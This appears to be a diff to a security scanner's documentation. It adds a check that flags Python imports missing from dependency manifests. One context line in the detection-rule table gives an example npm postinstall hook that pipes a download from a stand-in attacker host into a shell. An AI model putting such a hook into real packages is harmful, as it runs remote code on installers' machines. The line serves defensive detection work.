@@ -612,6 +612,13 @@ Scores ≥5 produce MEDIUM; ≥8 produce HIGH findings.
 | npm `postinstall` script | HIGH | `"postinstall": "curl evil.com \| sh"` |
 | Docker `FROM` without digest | HIGH | `FROM node:latest` |
 
+For Python source files, the same analyzer also reports each third-party import
+that is absent from the nearest `pyproject.toml`, `requirements.txt`, or
+`requirements-dev.txt`. Standard-library imports, relative/local modules, and
+imports guarded by `TYPE_CHECKING` are ignored. One finding is emitted per
+missing distribution with the first source location as evidence; repeated
+imports do not multiply the finding count.
+
 **Run with CVE scanning:**
 
 ```bash
